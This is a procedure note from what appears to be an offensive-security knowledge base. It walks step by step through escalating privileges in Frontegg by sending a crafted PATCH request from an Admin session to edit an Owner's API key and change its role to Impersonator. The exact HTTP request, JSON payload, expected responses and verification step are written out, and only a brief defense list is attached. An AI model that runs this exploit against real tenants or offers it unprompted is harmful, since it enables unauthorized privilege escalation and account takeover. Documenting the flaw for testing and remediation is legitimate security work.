---
id: proc-frontegg-execute-patch-001
tags:
  - patch-exploit
  - privilege-escalation
  - api-edit
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/frontegg-patch-api-key]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:32:29.172Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Execute-PATCH-and-Verify-API-Key-Edit

## Summary

This procedure sends the modified PATCH request to edit the Owner's API key (e.g., change description and role to Impersonator) from an Admin account, then verifies the unauthorized changes, demonstrating privilege escalation.

## Description

Using Burp Repeater, inject a JSON payload into the PATCH request to `/frontegg/identity/resources/tenants/api-tokens/v1/<API_KEY_ID>`, updating fields like description and roleIds. The endpoint lacks authorization checks for PATCH, allowing the edit. Post-execution, refresh the dashboard to confirm changes. Prerequisites: Modified request from prior step, known roleId (e.g., Impersonator UUID). Expected outcome: Successful update enabling escalated access.

## Requirements

1. Burp Repeater with PATCH request ready
2. Valid roleId for target role (e.g., Impersonator)
3. Admin session token

## Defense

Defensive measures and detection strategies:

- Enforce Owner-only checks for PATCH on API keys
- Alert on role changes in API keys
- Use immutable fields for sensitive key attributes

## Objectives

1. Perform unauthorized API key modification
2. Escalate privileges via role change
3. Validate impact through UI confirmation

## Instructions

### Step 1: Prepare JSON Payload

**Context**: Define changes for escalation.

Set request body to JSON: {"description":"desc111111","roleIds":["c22321ba-8ece-426d-b418-ece2a6d72009"] } where roleId is Impersonator.

**Expected Output**: Body populated in Repeater.

### Step 2: Send PATCH Request

**Context**: Execute the exploit.

Click Send in Burp Repeater.

Execute [[commands/frontegg-patch-api-key]]:

```http
PATCH /frontegg/identity/resources/tenants/api-tokens/v1/<API_KEY_ID> HTTP/1.1
Host: your-frontegg-instance.com
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json

{"description":"desc111111","roleIds":["c22321ba-8ece-426d-b418-ece2a6d72009"]}
```

> 200 OK response with updated fields.

### Step 3: Verify Changes

**Context**: Confirm exploitation success.

Refresh API keys dashboard as Admin or Owner.

**Expected Output**: Key shows new description and Impersonator role.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation

### Sub-Techniques


## Commands Used

- [[commands/frontegg-patch-api-key]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[patch-exploit]]
- [[privilege-escalation]]
- [[api-edit]]
